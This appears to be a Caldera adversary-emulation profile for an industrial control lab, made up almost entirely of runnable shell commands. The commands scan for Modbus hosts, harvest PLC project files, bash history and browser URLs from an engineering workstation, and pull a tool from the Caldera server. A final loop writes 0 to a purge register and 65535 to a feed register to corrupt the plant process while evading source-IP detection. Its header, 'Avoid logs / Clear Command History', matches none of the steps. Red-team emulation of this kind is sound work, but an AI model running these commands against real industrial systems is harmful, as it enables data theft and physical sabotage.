ability.technique_name: Indicator Removal on Host: Clear Command History
ability.name: Avoid logs

steps.command: echo "=== Active connections ===" && ss -tunap 2>/dev/null | head -30 && echo "=== Modbus port scan ===" && nmap -sT -p502 192.168.95.0/24 -oG - 2>/dev/null | grep "502/open" | awk '{print "MODBUS_HOST:", $2}'
steps.plaintext_command: echo "=== Active connections ===" && ss -tunap 2>/dev/null | head -30 && echo "=== Modbus port scan ===" && nmap -sT -p502 192.168.95.0/24 -oG - 2>/dev/null | grep "502/open" | awk '{print "MODBUS_HOST:", $2}'
steps.description:
Enumerate Modbus hosts using nmap instead of /dev/tcp (which is
bash-only and unavailable in sh).
steps.name: ICS Network Connection Enumeration

steps.command: echo "=== ST files ===" && find /home/engineer -name "*.st" -exec echo {} \; 2>/dev/null && echo "=== XML project files ===" && find /home/engineer -name "*.xml" -exec echo {} \; 2>/dev/null && echo "=== Bash history ===" && cat /home/engineer/.bash_history 2>/dev/null | tail -20 && echo "=== Firefox bookmarks (URLs) ===" && strings /home/engineer/.mozilla/firefox/*/places.sqlite 2>/dev/null | grep -oP 'https?://[^\s"]+' | sort -u | head -10
steps.plaintext_command: echo "=== ST files ===" && find /home/engineer -name "*.st" -exec echo {} \; 2>/dev/null && echo "=== XML project files ===" && find /home/engineer -name "*.xml" -exec echo {} \; 2>/dev/null && echo "=== Bash history ===" && cat /home/engineer/.bash_history 2>/dev/null | tail -20 && echo "=== Firefox bookmarks (URLs) ===" && strings /home/engineer/.mozilla/firefox/*/places.sqlite 2>/dev/null | grep -oP 'https?://[^\s"]+' | sort -u | head -10
steps.description:
Search the engineering workstation filesystem for PLC project
files (Structured Text, XML), configuration, and credentials.
steps.name: Harvest PLC Project Files from EWS

steps.command: curl -s -X POST -H "file:modbus_cli" -H "platform:linux" http://192.168.90.250:8888/file/download -o ./modbus_cli && chmod +x ./modbus_cli && echo "TOOL_TRANSFERRED: modbus_cli" && ls -la ./modbus_cli
steps.plaintext_command: curl -s -X POST -H "file:modbus_cli" -H "platform:linux" http://192.168.90.250:8888/file/download -o ./modbus_cli && chmod +x ./modbus_cli && echo "TOOL_TRANSFERRED: modbus_cli" && ls -la ./modbus_cli
steps.description:
Download the modbus_cli binary from Caldera server to the
engineering workstation, establishing attack capability on a
trusted ICS network host.
steps.name: Lateral Transfer - Modbus CLI to EWS

steps.command: for cycle in 1 2 3 4 5; do  echo "=== Cycle $cycle ===" &&  echo "PLC:" && ./modbus_cli 192.168.95.2 --port 502 read_ir 100 13 &&  echo "Tank:" && ./modbus_cli 192.168.95.14 --port 502 read_ir 1 2 &&  echo "Feed1:" && ./modbus_cli 192.168.95.10 --port 502 read_hr 1 1 &&  echo "Purge:" && ./modbus_cli 192.168.95.12 --port 502 read_hr 1 1 &&  sleep 5;done && echo "IO_COLLECTION_COMPLETE"
steps.plaintext_command: for cycle in 1 2 3 4 5; do  echo "=== Cycle $cycle ===" &&  echo "PLC:" && ./modbus_cli 192.168.95.2 --port 502 read_ir 100 13 &&  echo "Tank:" && ./modbus_cli 192.168.95.14 --port 502 read_ir 1 2 &&  echo "Feed1:" && ./modbus_cli 192.168.95.10 --port 502 read_hr 1 1 &&  echo "Purge:" && ./modbus_cli 192.168.95.12 --port 502 read_hr 1 1 &&  sleep 5;done && echo "IO_COLLECTION_COMPLETE"
steps.description:
Shell-based I/O collection instead of inline Python to avoid
whitespace mangling by Caldera.
steps.name: Scripted Automated I/O Image Collection

steps.command: for i in $(seq 1 30); do  ./modbus_cli 192.168.95.12 --port 502 write_r 1 0;  ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535;  sleep 0.2;done
steps.plaintext_command: for i in $(seq 1 30); do  ./modbus_cli 192.168.95.12 --port 502 write_r 1 0;  ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535;  sleep 0.2;done
steps.description:
Write corrupted values to the PLC's input registers from the
EWS IP address (192.168.95.5). Since the EWS is a legitimate
ICS host, Modbus writes from this IP are difficult to
distinguish from normal engineering operations.
steps.name: Manipulate PLC I/O Image from Trusted EWS

adversary.name: Engineering Workstation Pivot Adversary
adversary.description:
Compromises the EWS via external remote services, transfers Modbus
attack tooling laterally, then manipulates PLC I/O from a trusted
ICS network position to evade source-IP-based detection rules.

objectives.name: default
objectives.description: This is a default objective that runs forever.
